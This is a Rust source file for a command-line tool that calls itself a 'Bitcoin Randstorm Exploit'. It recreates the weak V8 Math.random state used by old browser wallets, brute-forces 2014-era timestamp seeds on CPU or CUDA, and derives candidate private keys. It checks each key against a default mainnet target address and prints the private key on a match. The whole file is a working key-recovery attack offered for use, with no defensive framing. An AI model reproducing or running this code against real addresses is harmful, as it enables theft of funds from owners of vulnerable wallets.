mod prng;
mod randstorm;
mod cuda;

use bitcoin::PublicKey;
use bitcoin::address::Address;
use bitcoin::hashes::{hash160, Hash};
use bitcoin::secp256k1::{PublicKey as SecpPublicKey, Secp256k1, SecretKey};
use clap::Parser;
use indicatif::{ProgressBar, ProgressStyle};
use prng::XorShift128Plus;
use randstorm::SecureRandom;
use rayon::prelude::*;
use std::str::FromStr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};

#[derive(Parser, Debug)]
#[command(name = "randstorm")]
#[command(version, about = "Bitcoin Randstorm Exploit - Rust")]
struct Args {
    #[arg(long, default_value = "1NUhcfvRthmvrHf1PAJKe5uEzBGK44ASBD")]
    target: String,

    #[arg(long, default_value = "1393635661000")]
    start: u64,

    #[arg(long, default_value = "1395038931000")]
    end: u64,

    #[arg(short, long, default_value_t = 0)]
    threads: usize,

    #[arg(short, long, default_value_t = 0xDEADBEEF)]
    v8seed: u64,

    #[arg(long, default_value_t = 10_000)]
    batch_size: usize,

    #[arg(long, default_value_t = false)]
    no_cuda: bool,
}

fn main() {
    let args = Args::parse();

    let target_addr = Address::from_str(&args.target)
        .expect("Invalid Bitcoin address")
        .require_network(bitcoin::Network::Bitcoin)
        .expect("Address not mainnet");

    let script = target_addr.script_pubkey();
    let script_bytes = script.as_bytes();
    assert_eq!(script_bytes.len(), 25, "Not a P2PKH address");
    let target_hash160: [u8; 20] = script_bytes[3..23].try_into().unwrap();

    let total = args.end - args.start;
    let threads = if args.threads == 0 {
        rayon::current_num_threads()
    } else {
        args.threads
    };

    eprintln!("randstorm — Bitcoin Randstorm Exploit (Rust)");
    eprintln!("Target: {}  (Hash160: {})", args.target, hex::encode(target_hash160));
    eprintln!("Seeds: {} → {}  (total: {})", args.start, args.end, total);

    let base_pool = {
        let mut prng = XorShift128Plus::new(args.v8seed);
        let mut pool = [0u8; 256];
        let mut pptr = 0;
        while pptr < 256 {
            let t = prng.next_math_random_u16();
            pool[pptr] = (t >> 8) as u8;
            pptr += 1;
            pool[pptr] = t as u8;
            pptr += 1;
        }
        pool
    };

    let cuda = if !args.no_cuda { cuda::CudaContext::try_init() } else { None };

    if let Some(cuda_ctx) = cuda {
        eprintln!("[CUDA] GPU acceleration ENABLED");
        eprintln!("[CUDA] NOTE: CPU secp256k1 is faster than current GPU kernel on GTX 1660 Ti");
        eprintln!("[CUDA] GPU kernel needs 32-bit limb optimization — using GPU pipeline anyway");
        run_gpu(args, base_pool, target_hash160, total, cuda_ctx);
    } else {
        eprintln!("Mode: CPU ({} threads)", threads);
        run_cpu(args, base_pool, target_hash160, total, threads);
    }
}

fn run_cpu(args: Args, base_pool: [u8; 256], target_hash160: [u8; 20], total: u64, threads: usize) {
    let pool = rayon::ThreadPoolBuilder::new()
        .num_threads(threads)
        .build()
        .expect("Failed to build thread pool");

    let pb = ProgressBar::new(total);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len} ({per_sec} keys/s, ETA: {eta})")
            .unwrap()
            .progress_chars("#>- "),
    );

    let found = Arc::new(AtomicBool::new(false));
    let found_key = Arc::new(Mutex::new(None::<String>));
    let batch_size = args.batch_size;

    pool.install(|| {
        (args.start as usize..args.end as usize)
            .into_par_iter()
            .chunks(batch_size)
            .for_each(|seeds_batch| {
                if found.load(Ordering::Relaxed) { return; }

                let secp = Secp256k1::new();
                let mut key_buf = [0u8; 32];

                for &seed in &seeds_batch {
                    if found.load(Ordering::Relaxed) { break; }

                    let mut sr = SecureRandom::from_pool(&base_pool, seed as u64);
                    sr.get_bytes(&mut key_buf);

                    let sk = match SecretKey::from_slice(&key_buf) {
                        Ok(k) => k,
                        Err(_) => continue,
                    };
                    let spk = SecpPublicKey::from_secret_key(&secp, &sk);
                    let h160 = hash160::Hash::hash(&spk.serialize());

                    if h160.as_byte_array() == &target_hash160 {
                        let key_hex = key_buf.iter().map(|b| format!("{:02x}", b)).collect::<String>();
                        let pk = PublicKey::new(spk);
                        let addr = Address::p2pkh(&pk, bitcoin::Network::Bitcoin);
                        eprintln!("\n\nMATCH FOUND! Seed: {}  Key: {}", seed, key_hex);
                        eprintln!("Address: {}", addr);
                        *found_key.lock().unwrap() = Some(key_hex);
                        found.store(true, Ordering::Relaxed);
                        return;
                    }
                }

                pb.inc(seeds_batch.len() as u64);
            });
    });

    pb.finish_with_message("Done");
    print_result(&found_key);
}

fn run_gpu(args: Args, base_pool: [u8; 256], target_hash160: [u8; 20], total: u64, cuda_ctx: cuda::CudaContext) {
    let gpu_batch = cuda_ctx.batch_size();

    let pb = ProgressBar::new(total);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len} ({per_sec} keys/s, ETA: {eta})")
            .unwrap()
            .progress_chars("#>- "),
    );

    let found = Arc::new(AtomicBool::new(false));
    let found_key = Arc::new(Mutex::new(None::<String>));
    let mut current_seed = args.start;

    eprintln!("GPU batch size: {} keys", gpu_batch);

    while current_seed < args.end && !found.load(Ordering::Relaxed) {
        let batch_count = gpu_batch.min((args.end - current_seed) as usize);
        let mut key_buffer = Vec::with_capacity(batch_count * 32);

        for s in current_seed..current_seed + batch_count as u64 {
            let mut sr = SecureRandom::from_pool(&base_pool, s);
            let mut kb = [0u8; 32];
            sr.get_bytes(&mut kb);
            key_buffer.extend_from_slice(&kb);
        }

        if let Some(h160s) = cuda_ctx.secp256k1_hash160_batch(&key_buffer, batch_count) {
            for (i, h160) in h160s.iter().enumerate() {
                if h160 == &target_hash160 {
                    let key_hex = key_buffer[i * 32..(i + 1) * 32]
                        .iter()
                        .map(|b| format!("{:02x}", b))
                        .collect::<String>();
                    let seed = current_seed + i as u64;
                    eprintln!("\n\nMATCH FOUND! Seed: {}  Key: {}", seed, key_hex);
                    *found_key.lock().unwrap() = Some(key_hex);
                    found.store(true, Ordering::Relaxed);
                    break;
                }
            }
        }

        current_seed += batch_count as u64;
        pb.inc(batch_count as u64);
    }

    pb.finish_with_message("Done");
    print_result(&found_key);
}

fn print_result(found_key: &Arc<Mutex<Option<String>>>) {
    let guard = found_key.lock().unwrap();
    if let Some(key) = guard.as_ref() {
        println!("Private Key: {}", key);
    } else {
        println!("No match found in the given seed range.");
    }
}
